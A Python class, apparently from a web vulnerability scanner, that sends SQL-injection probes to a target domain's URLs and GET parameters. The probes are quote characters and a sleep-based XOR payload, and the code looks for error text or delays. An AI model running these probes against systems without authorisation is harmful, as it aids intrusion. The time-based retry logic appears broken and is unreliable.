import urllib.parse as urlparse
from datetime import datetime
from typing import List
import requests
from Managers.CacheManager import CacheManager
from Models.GetRequestDTO import GetRequestDTO
from Models.SqliFoundDTO import SqliFoundDTO, SqliType


class SqliManager:
    def __init__(self, domain, cookies, headers):
        self.domain = domain
        self.cookies = cookies
        self.headers = headers
        self.error_based_payloads = ['\'', '\\', '"', '%27', '%5C']
        self.time_based_payload = 'XOR(if(1=1,sleep(5),0))'
        self.delay_in_seconds = 5

    def check_get_requests(self, dtos: List[GetRequestDTO]):
        print(f'[{datetime.now().strftime("%H:%M:%S")}]: SqliManager started...')

        cache_manager = CacheManager('SqliManagerResult', self.domain)
        result = cache_manager.get_saved_result()

        if result is None:
            result: List[SqliFoundDTO] = []
            for dto in dtos:
                self.check_url(dto, result)
                self.check_get_params(dto, result)

            cache_manager.save_result(result, has_final_result=True)

        print(f'[{datetime.now().strftime("%H:%M:%S")}]: SqliManager GET found {len(result)} items')

    def check_url(self, dto: GetRequestDTO, result: List[SqliFoundDTO]):

        parsed = urlparse.urlparse(dto.link)
        base_url = f'{parsed.scheme}://{parsed.hostname}{parsed.path}/'

        for payload in self.error_based_payloads:
            url = base_url + payload
            self.__send_error_based_request(url, result)

        time_based_payload = f'{base_url}{self.time_based_payload}'
        self.__send_time_based_request(time_based_payload, result)

    def check_get_params(self, dto: GetRequestDTO,  result: List[SqliFoundDTO]):
        error_based_payloads_urls = set()
        time_based_payloads_urls = set()
        parsed = urlparse.urlparse(dto.link)
        queries = filter(None, parsed.query.split("&"))

        for query in queries:
            param_split = query.split('=')
            main_url_split = dto.link.split(query)
            time_based_payloads_urls.add(
                main_url_split[0] + param_split[0] + '=' + self.time_based_payload + main_url_split[1])
            for payload in self.error_based_payloads:
                error_based_payloads_urls.add(main_url_split[0] + param_split[0] + '=' + payload + main_url_split[1])

        for payload in error_based_payloads_urls:
            self.__send_error_based_request(payload, result)

        for payload in time_based_payloads_urls:
            self.__send_time_based_request(payload, result)

    def __send_error_based_request(self, url, result: List[SqliFoundDTO]):
        try:
            response = requests.get(url, headers=self.headers, cookies=self.cookies)
            if response.status_code == 200 or str(response.status_code)[0] == '5':
                if not response.history or response.history[0].status_code != 301:
                    web_page = response.text.lower()
                    if 'syntax' in web_page or 'xapikeypoc' in web_page:
                        print(f"SQLiManager ({response.status_code}): - " + url)
                        result.append(SqliFoundDTO(url, SqliType.ERROR))
        except Exception as inst:
            print(inst)
            print("ERROR - " + url)

    def __send_time_based_request(self, url, result: List[SqliFoundDTO], attempt: int = 0):

        if attempt >= 3:
            return result.append(SqliFoundDTO(url, SqliType.TIME, result))

        try:
            response = requests.get(url, headers=self.headers, cookies=self.cookies)
            if (response.status_code == 200 or str(response.status_code)[0] == '5') \
                    and (response.elapsed.total_seconds() >= self.delay_in_seconds and attempt == 1):
                print(f"SQLiManager delay FOUND (status-{response.status_code}, attempt-{attempt}): - " + url)
                attempt += 1
                self.__send_time_based_request(url, result, attempt)
        except Exception as inst:
            print(inst)
            print("ERROR - " + url)
